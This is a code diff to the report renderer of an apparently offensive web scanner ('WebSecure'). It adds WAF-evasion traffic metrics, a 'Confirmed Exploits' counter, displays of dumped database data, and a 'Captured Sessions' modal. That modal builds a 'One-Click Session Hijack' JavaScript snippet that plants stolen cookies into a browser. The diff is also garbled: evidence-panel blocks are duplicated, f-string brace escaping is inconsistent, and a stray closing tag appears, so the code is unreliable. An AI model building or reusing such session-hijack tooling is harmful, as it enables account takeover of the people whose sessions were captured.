@@ -30,10 +30,18 @@ def render_html_dashboard(results: dict) -> str:
     if isinstance(final_items, list):
         for idx, item in enumerate(final_items):
             if not isinstance(item, dict): continue
+
+            # Filter out Generic items without useful info
+            f_type = item.get("type") or item.get("title") or "Generic"
+            f_sev = (item.get("severity") or "Info").title()
+            
+            # [User Request] Do NOT filter out Generic/Low items.
+            # Instead, ensure we render their details properly in the modal.
+
             f = {
                 "id": idx + 1,
-                "severity": (item.get("severity") or "Info").title(),
-                "type": item.get("type") or item.get("title") or "Generic",
+                "severity": f_sev,
+                "type": f_type,
                 "url": item.get("url") or "-",
                 "method": item.get("method") or "GET",
                 "param": item.get("param") or "-",
@@ -98,7 +106,9 @@ def render_html_dashboard(results: dict) -> str:
              proto = p.get("proto") or "tcp"
              service = p.get("service") or p.get("name") or "-"
              state = p.get("state") or "open"
-             if str(state).lower() == "open":
+             
+             # Accept "open" or "scanned" if we want to show them
+             if "open" in str(state).lower():
                  rows.append(f"<tr><td>{_escape(host)}</td><td>{port}</td><td>{_escape(proto)}</td><td>{_escape(service)}</td><td><span class='tag Low'>{_escape(state)}</span></td></tr>")
         
         if rows:
@@ -112,7 +122,47 @@ def render_html_dashboard(results: dict) -> str:
                     </table>
                 </div>
              </div>
+             </div>
              """
+
+    # --- Metrics / Traffic Data ---
+    metrics = results.get("metrics") or {}
+    counters = metrics.get("counters") or {}
+    total_req = counters.get("total", 0)
+    ok_2xx = counters.get("2xx", 0)
+    block_403 = counters.get("403", 0)
+    rate_429 = counters.get("429", 0)
+    
+    # Calculate "Successful" in terms of exploits (Severity > Low) vs "Failed" attempts
+    exploit_count = stats["Critical"] + stats["High"] + stats["Medium"]
+    
+    traffic_html = f"""
+    <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
+        <h3 style="margin-top:0;">🚦 Attack Traffic & Efficiency</h3>
+        <div class="stats-grid" style="grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); margin-bottom:0;">
+            <div class="stat-card" style="padding:1rem;">
+                <span class="stat-value" style="font-size:1.5rem; color:var(--text-main)">{total_req}</span>
+                <span class="stat-label">Total Requests</span>
+            </div>
+            <div class="stat-card" style="padding:1rem;">
+                <span class="stat-value" style="font-size:1.5rem; color:var(--sev-low)">{ok_2xx}</span>
+                <span class="stat-label">2xx (Passed)</span>
+            </div>
+             <div class="stat-card" style="padding:1rem;">
+                <span class="stat-value" style="font-size:1.5rem; color:var(--sev-high)">{block_403}</span>
+                <span class="stat-label">403 (WAF Block)</span>
+            </div>
+             <div class="stat-card" style="padding:1rem;">
+                <span class="stat-value" style="font-size:1.5rem; color:var(--sev-medium)">{rate_429}</span>
+                <span class="stat-label">429 (Rate Limit)</span>
+            </div>
+            <div class="stat-card" style="padding:1rem; border-color:var(--accent);">
+                <span class="stat-value" style="font-size:1.5rem; color:var(--accent)">{exploit_count}</span>
+                <span class="stat-label">Confirmed Exploits</span>
+            </div>
+        </div>
+    </div>
+    """
              
     # --- SSL Data Prep ---
     ssl_html = ""
@@ -142,6 +192,10 @@ def render_html_dashboard(results: dict) -> str:
         </div>
         """
 
+    # --- Sessions Data Prep ---
+    sessions = results.get("sessions") or []
+    sessions_json = json.dumps(sessions, default=str).replace("<", "\\u003c").replace(">", "\\u003e")
+    
     return f"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -239,6 +293,18 @@ def render_html_dashboard(results: dict) -> str:
             font-size: 1rem;
         }}
         
+        .btn {{
+            background: var(--accent);
+            color: #000;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }}
+        .btn:hover {{ opacity: 0.9; }}
+        
         /* Data Table */
         .table-container {{
             background: var(--bg-card);
@@ -332,9 +398,12 @@ def render_html_dashboard(results: dict) -> str:
     <div>
         <h1>🛡️ WebSecure Report</h1>
     </div>
-    <div class="header-meta">
-        <div>Target: <strong>{ _escape(target) }</strong></div>
-        <div>Date: { scan_date }</div>
+    <div style="display:flex; gap:10px; align-items:center;">
+        <button class="btn" onclick="showSessions()">🔑 Captured Sessions ({len(sessions)})</button>
+        <div class="header-meta">
+            <div>Target: <strong>{ _escape(target) }</strong></div>
+            <div>Date: { scan_date }</div>
+        </div>
     </div>
 </header>
 
@@ -370,6 +439,7 @@ def render_html_dashboard(results: dict) -> str:
     <!-- Network & SSL Info -->
     { ssl_html }
     { ports_html }
+    { traffic_html }
 
     <!-- Findings Table -->
     <h2>Findings</h2>
@@ -401,7 +471,7 @@ def render_html_dashboard(results: dict) -> str:
     <div class="modal-content">
         <div class="modal-header">
             <h2 id="modalTitle">Finding Detail</h2>
-            <span class="close" onclick="closeModal()">&times;</span>
+            <span class="close" onclick="closeModal('detailModal')">&times;</span>
         </div>
         <div class="modal-body" id="modalBody">
             <!-- Content -->
@@ -409,8 +479,22 @@ def render_html_dashboard(results: dict) -> str:
     </div>
 </div>
 
+<!-- Sessions Modal -->
+<div id="sessionsModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>🔑 Captured Sessions</h2>
+            <span class="close" onclick="closeModal('sessionsModal')">&times;</span>
+        </div>
+        <div class="modal-body" id="sessionsBody">
+            <!-- Populated by JS -->
+        </div>
+    </div>
+</div>
+
 <script>
     const data = { findings_json };
+    const sessions = { sessions_json };
     
     function renderTable(items) {{
         const tbody = document.getElementById('tableBody');
@@ -462,30 +546,155 @@ def render_html_dashboard(results: dict) -> str:
             }}
         }}
 
-        // Forensic/Kill Cam block
-        if(d.evidence && d.evidence.request_url) {{
-             html += `<h3>Kill Cam (Forensic)</h3>`;
-             html += `<div style="background:#0d1117; padding:10px; border:1px solid #30363d; border-radius:6px;">`;
-             html += `<div><strong>Target:</strong> ${d.evidence.request_url}</div>`;
-             if (d.evidence.response_status) {{
-                 html += `<div><strong>Status:</strong> ${d.evidence.response_status}</div>`;
-             }}
+        // [User Request] Render ALL keys in detail for Generic items to avoid "empty" look
+        // If it's a generic info item, dump unknown keys as a table
+        let knownKeys = ["url", "method", "severity", "location", "param", "reason", "poc", "payload", "evidence"];
+        let extraKeys = Object.keys(d).filter(k => !knownKeys.includes(k) && !k.startsWith("_"));
+        
+        if (extraKeys.length > 0) {{
+             html += `<h3>Additional Details</h3><div class="kv-grid">`;
+             extraKeys.forEach(k => {{
+                 let val = d[k];
+                 if (typeof val === 'object') val = JSON.stringify(val, null, 2);
+                 html += `<div class="label">${{escapeHtml(k)}}</div> <div><pre style="margin:0; padding:5px; font-size:0.85rem;">${{escapeHtml(val)}}</pre></div>`;
+             }});
              html += `</div>`;
         }}
 
+
+        // [WS3] Universal Forensic Panel (Evidence Locker)
+        const ev = d.evidence || {{}};
+        const hasEvidence = Object.keys(ev).length > 0;
+        
+        if (hasEvidence) {{
+            html += `<div style="margin-top:20px; border:1px solid var(--accent); border-radius:6px; overflow:hidden;">`;
+            html += `<div style="background:var(--accent); color:#000; padding:10px; font-weight:bold;">🔎 FACES OF EVIDENCE (FORENSICS)</div>`;
+            html += `<div style="padding:15px; background:var(--bg-card);">`;
+            
+            // 1. Database Extraction (SQLMap)
+            if (ev.database_banner || ev.extracted_data_type || ev.dumped_data) {{
+                html += `<h4 style="color:var(--sev-high); margin-top:0;">🩸 Database Extraction Detected</h4>`;
+                html += `<div class="kv-grid" style="margin-bottom:10px;">`;
+                if(ev.database_banner) html += `<div class="label">DB Banner</div> <div><code>${{escapeHtml(ev.database_banner)}}</code></div>`;
+                if(ev.extracted_data_type) html += `<div class="label">Extracted Type</div> <div>${{escapeHtml(ev.extracted_data_type)}}</div>`;
+                html += `</div>`;
+                
+                if (ev.dumped_data && Array.isArray(ev.dumped_data)) {{
+                    html += `<div><strong>Dumped Data Snippets:</strong></div>`;
+                    html += `<pre style="color:var(--sev-high); border-color:var(--sev-high);">${{escapeHtml(ev.dumped_data.join("\\n"))}}</pre>`;
+                }}
+            }}
+
+            // 2. XSS Alerts / Screenshots
+            if (ev.alert_text || ev.screenshot_path) {{
+                html += `<h4 style="color:var(--sev-med); margin-top:20px;">📸 DOM Exploitation Proof</h4>`;
+                html += `<div class="kv-grid">`;
+                if(ev.alert_text) html += `<div class="label">Alert Box</div> <div><code>${{escapeHtml(ev.alert_text)}}</code></div>`;
+                if(ev.screenshot_path) html += `<div class="label">Screenshot</div> <div><a href="${{escapeHtml(ev.screenshot_path)}}" target="_blank">View File</a></div>`;
+                html += `</div>`;
+            }}
+
+            // 3. Raw Response (Universal)
+            if (ev.raw_response) {{
+                html += `<h4 style="margin-top:20px;">📄 Raw Server Response</h4>`;
+                html += `<pre style="max-height:200px; overflow:auto; font-size:0.8rem;">${{escapeHtml(ev.raw_response)}}</pre>`;
+            }}
+
+            html += `</div></div>`;
+        }}
+            
+            // 2. XSS Proof (Alerts)
+            if (ev.alert_text || ev.mechanism) {
+                html += `<h4 style="color:var(--sev-critical); margin-top:10px;">📸 Verified Payload Execution</h4>`;
+                html += `<div style="background:rgba(218,54,51,0.1); border:1px solid var(--sev-critical); padding:10px; border-radius:4px;">`;
+                html += `<div><strong>Mechanism:</strong> ${escapeHtml(ev.mechanism || "Browser Event")}</div>`;
+                if(ev.alert_text) html += `<div><strong>Alert Content:</strong> <span style="font-family:monospace; background:#000; padding:2px 5px; color:#fff;">${escapeHtml(ev.alert_text)}</span></div>`;
+                html += `</div>`;
+            }
+
+            // 3. Raw Response (File Link or Snippet)
+            if (ev.raw_response) {
+                 html += `<h4 style="margin-top:15px;">📜 Raw Server Response (Snapshot)</h4>`;
+                 // Truncate if too long for modal
+                 let raw = ev.raw_response;
+                 if (raw.length > 2000) raw = raw.substring(0, 2000) + "... [truncated]";
+                 html += `<pre>${escapeHtml(raw)}</pre>`;
+            }
+            
+            // 4. Screenshots
+            if (ev.screenshot_path) {
+                 html += `<h4 style="margin-top:15px;">🖼️ Screen Capture</h4>`;
+                 html += `<img src="${escapeHtml(ev.screenshot_path)}" style="max-width:100%; border:1px solid #555;">`;
+            }
+            
+            // 5. Generic KV dump for other evidence keys
+            let usedKeys = ["database_banner", "extracted_data_type", "dumped_data", "alert_text", "mechanism", "raw_response", "screenshot_path"];
+            let otherKeys = Object.keys(ev).filter(k => !usedKeys.includes(k));
+            if(otherKeys.length > 0) {
+                 html += `<h4 style="margin-top:15px;">📂 Other Artifacts</h4><ul>`;
+                 otherKeys.forEach(k => {
+                     let val = ev[k];
+                     if(typeof val === 'object') val = JSON.stringify(val);
+                     html += `<li><strong>${escapeHtml(k)}:</strong> ${escapeHtml(val)}</li>`;
+                 });
+                 html += `</ul>`;
+            }
+
+            html += `</div></div>`; // End of Forensic Card
+        }
+        
         document.getElementById('modalBody').innerHTML = html;
+        modal.style.display = 'block';
+    }
+
+    function showSessions() {{
+        const modal = document.getElementById('sessionsModal');
+        const body = document.getElementById('sessionsBody');
+        
+        if (!sessions || sessions.length === 0) {{
+            body.innerHTML = "<p>No sessions captured.</p>";
+        }} else {{
+            let html = "";
+            sessions.forEach(s => {
+                const cookieJson = JSON.stringify(s.cookies || {});
+                const exportCmd = `
+// [WebSecure] One-Click Session Hijack
+const cookies = ${cookieJson};
+for (const [k, v] of Object.entries(cookies)) {
+    document.cookie = k + '=' + v + '; path=/';
+}
+console.log('%c[+] Session Injected! Reloading...', 'color:lime; font-size:14px;');
+setTimeout(() => location.reload(), 1000);
+`.trim();
+                
+                // Escape for visual display but keep raw for copy
+                const safeCmd = exportCmd.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                const safeCmdAttr = escapeHtml(exportCmd).replace(/"/g, "&quot;");
+
+                html += `<div class="card" style="margin-bottom:1rem; padding:1rem; background:var(--bg-body);">`;
+                html += `<div style="display:flex; justify-content:space-between; align-items:flex-start;">`;
+                html += `<div><strong>User:</strong> ${escapeHtml(s.user)} <span class="tag ${s.verified ? 'Low' : 'Info'}">${s.verified ? 'Verified' : 'Unverified'}</span></div>`;
+                html += `<button class="btn" onclick="navigator.clipboard.writeText(this.getAttribute('data-cmd')).then(()=>alert('Copied! Paste into DevTools Console.'))" data-cmd="${safeCmdAttr}" style="font-size:0.8rem; padding:4px 8px;">📋 Copy Hijack Script</button>`;
+                html += `</div>`;
+                
+                html += `<div><strong>Time:</strong> ${s.timestamp}</div>`;
+                html += `<h4>Cookies</h4><pre>${escapeHtml(JSON.stringify(s.cookies || {}, null, 2))}</pre>`;
+                html += `</div>`;
+            });
+            body.innerHTML = html;
+        }}
+        
         modal.style.display = 'block';
     }}
 
-    function closeModal() {{
-        document.getElementById('detailModal').style.display = 'none';
+    function closeModal(id) {{
+        document.getElementById(id || 'detailModal').style.display = 'none';
     }}
     
     // Close on click outside
     window.onclick = function(event) {{
-        const modal = document.getElementById('detailModal');
-        if (event.target == modal) {{
-            closeModal();
+        if (event.target.classList.contains('modal')) {{
+            event.target.style.display = 'none';
         }}
     }}
 
